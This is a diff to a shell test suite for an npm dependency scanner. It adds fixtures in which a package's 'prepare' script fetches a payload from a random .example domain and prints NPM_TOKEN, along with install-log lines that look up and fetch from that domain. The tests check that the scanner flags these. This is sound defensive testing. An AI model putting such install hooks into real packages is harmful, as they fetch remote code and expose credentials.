@@ -29,7 +29,7 @@ cat > "$WORK_DIR/project/node_modules/bad-pkg/package.json" <<'JSON'
   "version": "1.0.0",
   "scripts": {
     "install": "node install.js",
-    "prepare": "node -e \"console.log(process.env.NPM_TOKEN)\""
+    "prepare": "node -e \"fetch('https://a9f3k2m8q7z1x4n6p0r5.example/payload.js'); console.log(process.env.NPM_TOKEN)\""
   }
 }
 JSON
@@ -56,6 +56,7 @@ JSON
   assert_jq '.packages[] | select(.name == "bad-pkg") | .findings[] | select(.code == "JS_SECRET_ENV_REFERENCE" and .file == "install.js")' lifecycle.json
   assert_jq '.packages[] | select(.name == "bad-pkg") | .findings[] | select(.code == "JS_CHILD_PROCESS" and .file == "install.js")' lifecycle.json
   assert_jq '.packages[] | select(.name == "bad-pkg") | .findings[] | select(.code == "JS_SECRET_FILE_REFERENCE" and .file == "install.js")' lifecycle.json
+  assert_jq '.packages[] | select(.name == "bad-pkg") | .findings[] | select(.code == "GENERATED_DOMAIN_URL" and .script == "prepare")' lifecycle.json
   assert_jq '.policy.strict.enabled == false' lifecycle.json
 
   ANVIL_REPORT_DIR="$WORK_DIR/project/reports" anvil-dep-report >/tmp/anvil-dep-report.out
@@ -111,9 +112,15 @@ assert_jq '.highConfidenceFindings[] | select(.code == "NON_STANDARD_PORT")' "$W
 cat > "$WORK_DIR/logs/raw-url.log" <<'LOG'
 > package@1.0.0 install
 node -e "fetch('https://raw.githubusercontent.com/example/repo/main/install.js')"
+node -e "dns.lookup('a9f3k2m8q7z1x4n6p0r5.example')"
+node -e "fetch('https://a9f3k2m8q7z1x4n6p0r5.example/payload.js')"
 LOG
 anvil-scan-install-logs "$WORK_DIR/logs/raw-url.log" /dev/null > "$WORK_DIR/logs/raw-url-report.json"
 assert_jq '.mediumConfidenceFindings[] | select(.code == "RAW_OR_PASTE_SITE")' "$WORK_DIR/logs/raw-url-report.json"
+assert_jq '.mediumConfidenceFindings[] | select(.code == "GENERATED_DOMAIN_LOOKUP" and (.evidence | contains("a9f3k2m8q7z1x4n6p0r5.example")))' "$WORK_DIR/logs/raw-url-report.json"
+assert_jq '.policy.network.generatedDomainSeverity == "medium"' "$WORK_DIR/logs/raw-url-report.json"
+ANVIL_NETWORK_GENERATED_DOMAIN_SEVERITY=off anvil-scan-install-logs "$WORK_DIR/logs/raw-url.log" /dev/null > "$WORK_DIR/logs/generated-domain-off-report.json"
+test "$(jq '[.mediumConfidenceFindings[] | select(.code == "GENERATED_DOMAIN_LOOKUP")] | length' "$WORK_DIR/logs/generated-domain-off-report.json")" = "0"
 ANVIL_NETWORK_BLOCKED_HOSTS="raw.githubusercontent.com" anvil-scan-install-logs "$WORK_DIR/logs/raw-url.log" /dev/null > "$WORK_DIR/logs/blocked-url-report.json"
 assert_jq '.highConfidenceFindings[] | select(.code == "BLOCKED_NETWORK_HOST")' "$WORK_DIR/logs/blocked-url-report.json"
 
